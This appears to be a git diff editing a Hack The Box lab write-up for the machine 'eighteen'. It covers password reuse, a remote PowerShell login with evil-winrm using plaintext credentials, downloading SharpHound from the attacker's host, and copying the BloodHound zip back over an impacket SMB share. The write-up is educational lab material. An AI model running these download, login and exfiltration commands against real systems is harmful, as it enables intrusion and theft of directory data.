@@ -221,7 +221,7 @@ MSSQL       10.129.86.193   1433   DC01             1611: EIGHTEEN\carol.white
 MSSQL       10.129.86.193   1433   DC01             1612: EIGHTEEN\dave.green
 ```
 
-To rule out the possiblity of password reuse, I attempted to login to the windows remote management solution using the discovered admin credentials from the webapp. As it turns out, adam.scott is guilty of reusing the same password for the admin account and I was able to login as his account to the windows host. The Evil-WinRM client allows for a remote powershell terminal, giving a user level foothold on the server.
+To rule out the possiblity of password reuse, I attempted to login to the windows remote management solution using the discovered admin credentials from the webapp. As it turns out, adam.scott is guilty of reusing the same password for the admin webapp account and I was able to login as his account on the windows host. The Evil-WinRM client allows for a remote powershell terminal, giving a user level foothold on the server.
 
 ```bash
 evil-winrm -i eighteen.htb -u adam.scott -p iloveyou1
@@ -248,8 +248,18 @@ WindowsVersion                                          : 2009
 OSDisplayVersion                                        : 24H2
 ```
 
+Since this was the first windows machine that I had attempted to compromise, I wanted to get familiar with active directory enumeration tools. Some research led me to land on bloodhound which is a data collection and visualisation tool focussed on the relationships between active directory objects. To collect the data, a binary called sharphound can be uploaded to the machine which produces a zip file describing those relationships.
+
 ```bash
 *Evil-WinRM* PS C:\programdata> wget http://10.10.14.77:8080/SharpHound.exe -outfile run.exe
+```
+
+With the data collected, I can exfiltrate the data back from the machine. Windows will connect to my SMB share which I establish on my machine and let me copy the zip file back onto my computer for analysis.
+
+```bash
+┌──(kali㉿kali)-[~/projects/htb/eighteen]
+└─$ sudo impacket-smbserver share . -smb2support -username exfil -password exfil
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 
 ```bash
@@ -259,11 +269,9 @@ The command completed successfully.
 *Evil-WinRM* PS C:\programdata> copy 20261109174631_BloodHound.zip \\10.10.14.77\share\
 ```
 
-```bash
-┌──(kali㉿kali)-[~/projects/htb/eighteen]
-└─$ sudo impacket-smbserver share . -smb2support -username exfil -password exfil
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
-```
+To analyse the results, I made use of the bloodhound docker file [found here](https://github.com/SpecterOps/BloodHound/wiki/Development) to easily spin up and down the container. 
+
+
 
 ## Bad Successor
 
